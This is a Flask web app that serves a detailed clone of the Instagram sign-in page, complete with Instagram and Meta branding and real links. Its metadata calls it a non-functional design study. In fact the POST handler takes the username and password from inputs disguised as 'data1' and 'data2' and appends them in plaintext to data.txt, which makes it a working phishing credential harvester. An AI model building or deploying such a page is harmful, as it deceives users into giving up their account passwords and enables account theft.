from flask import Flask, request, render_template_string

app = Flask(__name__, static_folder="assets", static_url_path="/assets")

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="A local, non-functional design study of the Instagram sign-in page.">
  <meta name="color-scheme" content="dark">
  <title>Instagram</title>
  <link rel="icon" href="/assets/images/instagram-glyph.png" type="image/png">
  <link rel="stylesheet" href="/assets/fonts/fonts.css">
  <style>
    :root {
      --bg: #0c1014;
      --surface: #1f1f20;
      --fg: #f3f4f5;
      --muted: #a2aab4;
      --border: #4b4d4f;
      --input-border: #525456;
      --accent: #4ba9fe;
      --primary: #0064e0;
      --primary-hover: #0057c2;
      --primary-pressed: #004aa6;
      --primary-disabled: #133b6d;
      --facebook: #28292b;
      --footer-fg: #a2aab4;
      --font-body: "Optimistic Text", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      --font-display: "Instagram Sans", "Optimistic Display", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    * {
      box-sizing: border-box;
    }

    html {
      color-scheme: dark;
      scrollbar-color: #3a3d41 var(--bg);
    }

    body {
      margin: 0;
      min-width: 320px;
      background: var(--bg);
      color: var(--fg);
      font-family: var(--font-body);
      font-size: 14px;
      line-height: 18px;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    img,
    svg {
      flex: none;
    }

    a {
      color: inherit;
    }

    button {
      font-family: inherit;
    }

    :focus-visible {
      outline: 2px solid #b8c0c9;
      outline-offset: 3px;
    }

    .page {
      display: flex;
      flex-direction: column;
      min-height: 100svh;
    }

    .mobile-header {
      display: none;
    }

    .layout {
      display: flex;
      align-items: stretch;
      flex: 0 0 auto;
      min-height: max(831px, calc(100svh - 135px));
    }

    .brand-panel {
      flex: 0 0 55.3%;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 46px 20px 36px;
      background: var(--bg);
    }

    .brand-glyph {
      display: block;
      align-self: flex-start;
      width: 60px;
      height: 60px;
      margin-left: 26px;
    }

    .brand-inner {
      position: relative;
      left: 12px;
      width: 100%;
      max-width: 586px;
      margin-top: 38px;
      text-align: center;
    }

    .headline {
      width: 100%;
      margin: 0;
      color: var(--fg);
      font-family: var(--font-display);
      font-size: clamp(28px, 2.78vw, 40px);
      font-weight: 400;
      line-height: 1.62;
      letter-spacing: -0.012em;
      text-align: center;
    }

    .headline-line {
      display: block;
    }

    .headline-gradient {
      width: fit-content;
      margin: 0 auto;
      background-image: linear-gradient(90deg, #f25650 0%, #fd006f 48%, #d400c3 100%);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }

    .collage {
      display: block;
      width: min(733px, 100%);
      aspect-ratio: 733 / 530;
      height: auto;
      position: relative;
      left: -8px;
      margin-top: -10px;
      object-fit: contain;
    }

    .auth-panel {
      flex: 1 1 auto;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 0 52px 0 38px;
      background: var(--surface);
      border-left: 1px solid var(--border);
    }

    .auth-form {
      display: flex;
      flex-direction: column;
      width: 100%;
      max-width: 546px;
      margin-top: 5px;
    }

    .auth-title {
      margin: 6px 0 21px;
      color: var(--fg);
      font-family: "Optimistic Display", var(--font-body);
      font-size: 17px;
      font-weight: 600;
      line-height: 22px;
      letter-spacing: 0.005em;
    }

    .field {
      display: flex;
      align-items: center;
      height: 60px;
      padding: 0 15px;
      background: transparent;
      border: 1px solid var(--input-border);
      border-radius: 12px;
      transition: border-color 140ms ease, background-color 140ms ease;
    }

    .field + .field {
      margin-top: 12px;
    }

    .field:hover {
      border-color: #6d737b;
    }

    .field:focus-within {
      border-color: #d7dce2;
      background: #222325;
    }

    .field input {
      width: 100%;
      height: 100%;
      padding: 0;
      color: #f8f9f9;
      font-family: var(--font-body);
      font-size: 15px;
      font-weight: 500;
      line-height: 19px;
      letter-spacing: 0.005em;
      text-overflow: ellipsis;
      background: transparent;
      border: 0;
      outline: 0;
    }

    .field input::placeholder {
      color: var(--muted);
      opacity: 1;
    }

    .sr-only {
      position: absolute;
      width: 1px;
      height: 1px;
      padding: 0;
      margin: -1px;
      overflow: hidden;
      clip: rect(0 0 0 0);
      white-space: nowrap;
      border: 0;
    }

    .primary-button {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 44px;
      margin-top: 25px;
      color: #ffffff;
      font-family: var(--font-body);
      font-size: 15px;
      font-weight: 500;
      line-height: 19px;
      background: var(--primary);
      border: 0;
      border-radius: 22px;
      cursor: pointer;
      transition: background-color 140ms ease;
    }

    .primary-button:not(:disabled):hover {
      background: var(--primary-hover);
    }

    .primary-button:not(:disabled):active {
      background: var(--primary-pressed);
    }

    .primary-button:disabled {
      color: rgba(243, 244, 245, 0.62);
      background: var(--primary-disabled);
      cursor: default;
    }

    .forgot-link {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 44px;
      margin-top: 12px;
      color: var(--fg);
      font-size: 15px;
      font-weight: 500;
      line-height: 19px;
      text-decoration: none;
    }

    .forgot-link:hover {
      color: #ffffff;
      text-decoration: underline;
      text-underline-offset: 3px;
    }

    .facebook-button {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      width: 100%;
      height: 44px;
      margin-top: 52px;
      color: var(--fg);
      font-size: 15px;
      font-weight: 500;
      line-height: 19px;
      text-decoration: none;
      background: var(--facebook);
      border: 0;
      border-radius: 22px;
      cursor: pointer;
      transition: background-color 140ms ease;
    }

    .facebook-button svg {
      width: 16px;
      height: 16px;
      color: #0082fb;
    }

    .facebook-button:hover {
      background: #33363a;
    }

    .facebook-button:active {
      background: #3a3d41;
    }

    .signup-link {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 44px;
      margin-top: 12px;
      color: var(--accent);
      font-size: 15px;
      font-weight: 500;
      line-height: 19px;
      text-decoration: none;
      border: 1px solid var(--accent);
      border-radius: 22px;
      transition: background-color 140ms ease, border-color 140ms ease, color 140ms ease;
    }

    .signup-link:hover {
      color: #7cc4ff;
      background: rgba(75, 169, 254, 0.09);
      border-color: #7cc4ff;
    }

    .signup-link:active {
      background: rgba(75, 169, 254, 0.15);
    }

    .form-meta {
      display: flex;
      justify-content: center;
      margin-top: 28px;
      color: #dee3e9;
    }

    .form-meta svg {
      width: 60px;
      height: 12px;
    }

    .site-footer {
      flex: 0 0 auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 0;
      min-height: 135px;
      padding: 20px 16px 57px;
      background: var(--bg);
    }

    .footer-nav {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 0 16px;
      max-width: 1320px;
      color: var(--footer-fg);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 12px;
      font-weight: 400;
      line-height: 16px;
      text-align: center;
    }

    .footer-nav a {
      color: var(--footer-fg);
      text-decoration: none;
    }

    .footer-nav a:hover {
      color: #f5f5f5;
      text-decoration: underline;
      text-underline-offset: 2px;
    }

    .footer-bottom {
      display: flex;
      align-items: center;
      gap: 24px;
      margin-top: 22px;
      color: var(--footer-fg);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 12px;
      line-height: 16px;
    }

    .lang-wrap {
      position: relative;
    }

    .lang-button {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 2px 0;
      color: var(--footer-fg);
      font-size: 12px;
      line-height: 16px;
      background: transparent;
      border: 0;
      border-radius: 4px;
      cursor: pointer;
    }

    .lang-button:hover {
      color: #f5f5f5;
    }

    .lang-button svg {
      width: 12px;
      height: 12px;
    }

    .lang-menu {
      position: absolute;
      bottom: calc(100% + 10px);
      left: 50%;
      z-index: 20;
      width: 184px;
      max-height: 250px;
      padding: 6px;
      overflow-y: auto;
      background: #26282b;
      border: 1px solid #3d4044;
      border-radius: 12px;
      box-shadow: 0 14px 36px rgba(0, 0, 0, 0.5);
      transform: translateX(-50%);
    }

    .lang-menu[hidden] {
      display: none;
    }

    .lang-menu button {
      display: block;
      width: 100%;
      padding: 8px 10px;
      color: var(--fg);
      font-size: 13px;
      line-height: 18px;
      text-align: left;
      background: transparent;
      border: 0;
      border-radius: 8px;
      cursor: pointer;
    }

    .lang-menu button:hover {
      background: #34373b;
    }

    .lang-menu button[aria-selected="true"] {
      color: #ffffff;
      background: #34373b;
    }

    .toast {
      position: fixed;
      bottom: 24px;
      left: 50%;
      z-index: 60;
      max-width: calc(100vw - 32px);
      padding: 12px 16px;
      color: #f3f4f5;
      font-size: 13px;
      line-height: 18px;
      text-align: center;
      background: #26282b;
      border: 1px solid #3d4044;
      border-radius: 12px;
      box-shadow: 0 14px 36px rgba(0, 0, 0, 0.45);
      opacity: 0;
      pointer-events: none;
      transform: translate(-50%, 10px);
      transition: opacity 180ms ease, transform 180ms ease;
    }

    .toast.is-visible {
      opacity: 1;
      transform: translate(-50%, 0);
    }

    @media (prefers-reduced-motion: reduce) {
      *,
      *::before,
      *::after {
        scroll-behavior: auto !important;
        transition-duration: 0.01ms !important;
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
      }
    }

    @media (max-width: 875px) {
      .page {
        min-height: 100svh;
      }

      .mobile-header {
        display: flex;
        align-items: center;
        justify-content: center;
        height: 132px;
        background: var(--bg);
      }

      .mobile-header img {
        display: block;
        width: 60px;
        height: 60px;
      }

      .layout {
        display: block;
        min-height: 0;
      }

      .brand-panel {
        display: none;
      }

      .auth-panel {
        display: block;
        padding: 79px 52px 61px;
        background: var(--surface);
        border-top: 1px solid var(--border);
        border-left: 0;
      }

      .auth-form {
        max-width: 100%;
        margin-top: 0;
      }

      .auth-title {
        margin: 0 0 18px;
      }

      .field input {
        font-size: 16px;
        line-height: 20px;
      }

      .primary-button {
        margin-top: 24px;
      }

      .forgot-link {
        margin-top: 12px;
      }

      .facebook-button {
        margin-top: 52px;
      }

      .signup-link {
        margin-top: 12px;
      }

      .facebook-button {
        color: #b5b7bb;
      }

      .site-footer {
        min-height: 0;
        padding: 24px 16px 37px;
      }

      .footer-nav {
        gap: 5px 16px;
        max-width: 100%;
        line-height: 18px;
      }

      .footer-bottom {
        margin-top: 43px;
      }
    }

    @media (max-width: 360px) {
      .auth-panel {
        padding-right: 24px;
        padding-left: 24px;
      }
    }
  </style>
</head>
<body>
  <div class="page">
    <div class="mobile-header" data-od-id="mobile-header">
      <img src="/assets/images/instagram-glyph.png" width="60" height="60" alt="Instagram">
    </div>

    <main class="layout" data-od-id="login-layout">
      <section class="brand-panel" data-od-id="brand-panel" aria-labelledby="brand-headline">
        <img class="brand-glyph" src="/assets/images/instagram-glyph.png" width="60" height="60" alt="Instagram">
        <div class="brand-inner">
          <h1 class="headline" id="brand-headline" data-od-id="brand-headline">
            <span class="headline-line">See everyday moments from your</span>
            <span class="headline-line headline-gradient">close friends.</span>
          </h1>
        </div>
        <img
          class="collage"
          src="/assets/images/instagram-collage.webp"
          width="1647"
          height="1362"
          alt="A collage of friends sharing everyday moments"
          data-od-id="brand-collage"
        >
      </section>

      <section class="auth-panel" data-od-id="auth-panel" aria-labelledby="login-title">
        <form class="auth-form" method="POST" action="/" data-od-id="login-form" novalidate>
          <h2 class="auth-title" id="login-title">Log into Instagram</h2>

          <label class="field" data-od-id="login-identifier-field">
            <span class="sr-only">Mobile number, username or email</span>
            <input
              id="login-identifier"
              name="data1"
              type="text"
              placeholder="Mobile number, username or email"
              autocomplete="username"
              autocapitalize="off"
              spellcheck="false"
              data-od-id="login-identifier"
            >
          </label>

          <label class="field" data-od-id="login-password-field">
            <span class="sr-only">Password</span>
            <input
              id="login-password"
              name="data2"
              type="password"
              placeholder="Password"
              autocomplete="current-password"
              data-od-id="login-password"
            >
          </label>

          <button class="primary-button" type="submit" disabled data-od-id="login-submit">Log in</button>

          <a
            class="forgot-link"
            href="https://www.instagram.com/accounts/password/reset/"
            target="_blank"
            rel="noopener noreferrer"
            data-od-id="forgot-password"
          >Forgot password?</a>

          <a
            class="facebook-button"
            href="https://www.facebook.com/login/"
            target="_blank"
            rel="noopener noreferrer"
            data-od-id="facebook-login"
          >
            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
              <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path>
            </svg>
            <span>Log in with Facebook</span>
          </a>

          <a
            class="signup-link"
            href="https://www.instagram.com/accounts/emailsignup/"
            target="_blank"
            rel="noopener noreferrer"
            aria-label="Create new account"
            data-od-id="create-account"
          >Create new account</a>

          <div class="form-meta" data-od-id="meta-logo">
            <svg viewBox="0 0 500 100" role="img" aria-label="Meta" fill="currentColor">
              <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"></path>
              <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"></path>
            </svg>
          </div>
        </form>
      </section>
    </main>

    <footer class="site-footer" data-od-id="site-footer">
      <nav class="footer-nav" aria-label="Instagram links" data-od-id="footer-links">
        <a href="https://about.meta.com/" target="_blank" rel="noopener noreferrer">Meta</a>
        <a href="https://about.instagram.com/" target="_blank" rel="noopener noreferrer">About</a>
        <a href="https://about.instagram.com/blog/" target="_blank" rel="noopener noreferrer">Blog</a>
        <a href="https://about.instagram.com/about-us/careers" target="_blank" rel="noopener noreferrer">Jobs</a>
        <a href="https://help.instagram.com/" target="_blank" rel="noopener noreferrer">Help</a>
        <a href="https://developers.facebook.com/docs/instagram-platform" target="_blank" rel="noopener noreferrer">API</a>
        <a href="https://www.instagram.com/legal/privacy/" target="_blank" rel="noopener noreferrer">Privacy</a>
        <a href="https://www.instagram.com/legal/terms/" target="_blank" rel="noopener noreferrer">Terms</a>
        <a href="https://www.instagram.com/explore/locations/" target="_blank" rel="noopener noreferrer">Locations</a>
        <a href="https://www.instagram.com/popular/" target="_blank" rel="noopener noreferrer">Popular</a>
        <a href="https://www.instagram.com/web/lite/" target="_blank" rel="noopener noreferrer">Instagram Lite</a>
        <a href="https://www.meta.ai/" target="_blank" rel="noopener noreferrer">Meta AI</a>
        <a href="https://www.instagram.com/muse/" target="_blank" rel="noopener noreferrer">Muse</a>
        <a href="https://www.threads.com/" target="_blank" rel="noopener noreferrer">Threads</a>
        <a href="https://www.instagram.com/legal/contact-non-users/" target="_blank" rel="noopener noreferrer">Contact Uploading &amp; Non-Users</a>
        <a href="https://about.meta.com/technologies/meta-verified/" target="_blank" rel="noopener noreferrer">Meta Verified</a>
      </nav>

      <div class="footer-bottom">
        <div class="lang-wrap">
          <button
            class="lang-button"
            id="lang-button"
            type="button"
            aria-haspopup="listbox"
            aria-expanded="false"
            aria-controls="lang-menu"
            data-od-id="language-picker"
          >
            <span>English</span>
            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
              <path d="M21 17.502a.997.997 0 0 1-.707-.293L12 8.913l-8.293 8.296a1 1 0 1 1-1.414-1.414l9-9.004a1.03 1.03 0 0 1 1.414 0l9 9.004A1 1 0 0 1 21 17.502Z"></path>
            </svg>
          </button>

          <div class="lang-menu" id="lang-menu" role="listbox" aria-label="Language" hidden>
            <button type="button" role="option" aria-selected="true">English</button>
            <button type="button" role="option" aria-selected="false">Español</button>
            <button type="button" role="option" aria-selected="false">Français</button>
            <button type="button" role="option" aria-selected="false">Deutsch</button>
            <button type="button" role="option" aria-selected="false">Português (Brasil)</button>
            <button type="button" role="option" aria-selected="false">Italiano</button>
            <button type="button" role="option" aria-selected="false">日本語</button>
            <button type="button" role="option" aria-selected="false">한국어</button>
          </div>
        </div>

        <span class="copyright">© 2026 Instagram from Meta</span>
      </div>
    </footer>
  </div>

  <div class="toast" id="toast" role="status" aria-live="polite"></div>

  <script>
    (function () {
      var form = document.querySelector('[data-od-id="login-form"]');
      var identifier = document.getElementById('login-identifier');
      var password = document.getElementById('login-password');
      var submit = document.querySelector('[data-od-id="login-submit"]');
      var toast = document.getElementById('toast');
      var langButton = document.getElementById('lang-button');
      var langMenu = document.getElementById('lang-menu');
      var toastTimer = 0;

      function showToast(message) {
        toast.textContent = message;
        toast.classList.add('is-visible');
        window.clearTimeout(toastTimer);
        toastTimer = window.setTimeout(function () {
          toast.classList.remove('is-visible');
        }, 3200);
      }

      function syncSubmit() {
        var ready = identifier.value.trim().length > 0 && password.value.length > 0;
        submit.disabled = !ready;
      }

      identifier.addEventListener('input', syncSubmit);
      password.addEventListener('input', syncSubmit);
      syncSubmit();

      form.addEventListener('submit', function (event) {
        if (submit.disabled) {
          event.preventDefault();
          return;
        }
      });

      function setLangOpen(open) {
        langMenu.hidden = !open;
        langButton.setAttribute('aria-expanded', open ? 'true' : 'false');
      }

      langButton.addEventListener('click', function (event) {
        event.stopPropagation();
        setLangOpen(langMenu.hidden);
      });

      langMenu.addEventListener('click', function (event) {
        var option = event.target.closest('button[role="option"]');
        if (!option) return;
        setLangOpen(false);
        langButton.focus();
        showToast('Language switching is unavailable in this design study.');
      });

      document.addEventListener('click', function (event) {
        if (!event.target.closest('.lang-wrap')) setLangOpen(false);
      });

      document.addEventListener('keydown', function (event) {
        if (event.key === 'Escape' && !langMenu.hidden) {
          setLangOpen(false);
          langButton.focus();
        }
      });
    })();
  </script>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        data1 = request.form.get("data1") or request.form.get("identifier", "")
        data2 = request.form.get("data2") or request.form.get("password", "")

        with open("data.txt", "a", encoding="utf-8") as f:
            f.write(f"{data1}\n")
            f.write(f"{data2}\n")
            f.write("-" * 30 + "\n")

    return render_template_string(HTML)

if __name__ == "__main__":
    app.run(debug=True)